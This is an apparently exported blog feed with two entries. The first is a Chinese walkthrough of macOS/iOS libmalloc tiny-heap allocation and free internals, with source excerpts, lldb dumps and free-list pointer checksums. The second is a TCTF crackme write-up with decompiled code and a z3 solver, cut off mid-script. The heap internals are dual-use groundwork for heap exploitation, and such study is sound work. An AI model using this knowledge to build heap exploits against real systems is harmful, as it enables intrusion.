MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    